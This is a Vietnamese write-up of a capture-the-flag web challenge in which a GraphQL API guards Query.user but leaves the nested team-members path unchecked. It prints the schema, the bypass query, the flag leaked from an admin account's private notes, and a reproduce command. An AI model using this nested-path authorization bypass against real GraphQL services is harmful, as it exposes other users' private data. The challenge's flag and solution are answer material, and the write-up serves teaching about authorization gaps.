# Shape of Query — WEB (300 pts)

**Flag:** `POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}`
**Target:** `https://shape-of-query.pointeroverflowctf.com`

## Đề bài

Bối cảnh thử thách là một cổng thông tin "Collaborative Research Portal". Tác giả đưa ra lời mời thử nghiệm hệ thống kèm theo lưu ý về tính năng **bảo mật người dùng** (user security), nhằm ngăn chặn các nhà nghiên cứu truy cập vào dữ liệu của nhau. 
Hệ thống được đặt trên một tên miền phụ (subdomain) riêng biệt. Người chơi sử dụng mã phiên (session token) riêng của đội để đăng nhập (token có hiệu lực 15 phút và thay đổi mỗi khi tải lại trang). Sau khi đăng nhập, hệ thống cung cấp một **API GraphQL tại đường dẫn `/graphql`, với tính năng introspection (tự phản chiếu) đang được kích hoạt**.

## Phân tích ban đầu

Giao diện đăng nhập chỉ yêu cầu mã token. Khi gửi gói tin `POST /session/exchange` chứa token hợp lệ, máy chủ trả về `{"ok":true,"team_id":612}` và thiết lập cookie `session`. Truy cập vào `/graphql`, giao diện GraphiQL hiển thị đầy đủ.

Nhờ tính năng introspection, cấu trúc dữ liệu tiết lộ 4 đối tượng (type) chính:

```graphql
type Query { me: User   user(id: ID!): User }
type User  { id: ID!  username: String!  role: UserRoleEnum  team: Team  privateNotes: String }
type Team  { id: ID!  name: String  members: [User] }
enum UserRoleEnum { ADMIN MEMBER }
```

Phần mô tả trên máy chủ chỉ ra các quy tắc phân quyền: field `user` được ghi chú "You may only view yourself" (Chỉ xem được bản thân), `privateNotes` có thông báo "Visible to the account owner only" (Chỉ chủ tài khoản mới được xem), và `members` có chú thích "Cross-team enumeration is blocked" (Chặn liệt kê chéo giữa các đội). Mục tiêu của thử thách là trích xuất nội dung trường `privateNotes` của một tài khoản khác trong hệ thống.

Kiểm tra truy vấn `me` trả về đối tượng `researcher_612` với nội dung `privateNotes`: "Grocery list, personal reminders. Nothing worth reading." - đây là một dữ liệu giả (decoy).

## Quá trình phân tích

**Bước 1 - Phân tích đường dẫn truy xuất dữ liệu.** 
Mặc dù trường `Query.user` có giới hạn quyền, dữ liệu `privateNotes` vẫn có thể được truy xuất thông qua một đường dẫn gián tiếp: `Query.me -> User.team -> Team.members -> privateNotes`. Đáng chú ý là ghi chú "You may only view yourself" chỉ áp dụng cho trường `Query.user`.

**Bước 2 - Truy xuất qua đường dẫn lồng nhau (Nested Path).**
Thực hiện truy vấn lồng nhau:

```graphql
{ me { team { members { id username role privateNotes } } } }
```

Phản hồi trả về:

```json
{"data":{"me":{"team":{"members":[
  {"id":"user_612","privateNotes":"Grocery list, personal reminders. Nothing worth reading.","role":"MEMBER","username":"researcher_612"},
  {"id":"admin_612","privateNotes":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}","role":"ADMIN","username":"admin_612"}
]}}}}
```

Kết quả cho thấy trường `Team.members` trả về thông tin mọi thành viên trong đội cùng với trường `privateNotes` mà không áp dụng cơ chế kiểm tra phân quyền. Khảo sát cấu trúc hệ thống, mỗi đội được chỉ định một tài khoản có dạng `admin_<team_id>`, và lá cờ của đội được lưu trong trường ghi chú cá nhân của tài khoản này.

**Bước 3 - Xác thực cơ chế phân quyền.** 
Khi thực thi truy vấn trực tiếp `user(id:"admin_612")`, kết quả trả về là `null`, dù tài khoản này thuộc cùng đội. Điều này chứng minh cơ chế phân quyền bảo mật chỉ được cấu hình tại resolver của `Query.user`, trong khi resolver của `Team.members` bị bỏ sót. Chuỗi nonce `EB7ZOZUZT7FJHWR2` trong thân cờ khớp với nonce trong session token, xác nhận đây là cờ hợp lệ của đội 612.

**Bước 4 - Xác thực cờ.**

```http
POST /challenges/shape-of-query/submit
{"flag":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}"}
{"correct":true,"message":"Correct."}
```

## Flag

```
POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}
```

Lưu ý bảo mật: Trong GraphQL, việc chỉ thiết lập cơ chế phân quyền tại **bộ giải quyết (resolver) của các trường (field) cấp cao** là chưa đủ. Dữ liệu nhạy cảm có thể bị truy cập thông qua **các lộ trình khác** trong đồ thị (type graph). Cần đảm bảo kiểm tra quyền trên tất cả các đường dẫn có thể truy cập tới dữ liệu đích.

## Reproduce

```bash
python exploit.py "<điền mã session token lấy trên trang challenge>"
```
